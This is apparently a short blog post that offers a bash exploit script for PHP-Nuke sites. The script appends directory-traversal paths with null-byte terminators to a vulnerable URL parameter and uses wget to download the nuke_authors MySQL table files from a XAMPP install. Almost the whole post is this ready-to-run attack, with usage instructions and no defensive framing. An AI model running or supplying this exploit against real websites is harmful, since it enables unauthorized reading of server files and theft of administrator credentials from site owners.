---
title: Download PHP Nuke database tables
date: 2017-06-29 05:38:33
---

### A simple script to help download php nuke database tables
**Usage ./filename http://someurl.com/folder-structure/filename.php?params=**
```bash
#!/bin/bash

if [[ $# -eq 0 ]] ; then
    echo '[X] Usage ./filename http://someurl.com/folder-structure/filename.php?params='
    exit 0
fi

urls=(
"${1}..\..\..\..\..\..\..\apachefriends\xampp\mysql\data\nuke\nuke_authors.MYI%00"
"${1}..\..\..\..\..\..\..\apachefriends\xampp\mysql\data\nuke\nuke_authors.MYD%00"
"${1}..\..\..\..\..\..\..\apachefriends\xampp\mysql\data\nuke\nuke_authors.frm%00")

filenames=('nuke_authors.MYI' 'nuke_authors.MYD' 'nuke_authors.frm')
for (( i = 0; i < ${#urls[@]}; ++i )); do
    wget "${urls[$i]}" -O "${filenames[$i]}"
done

```
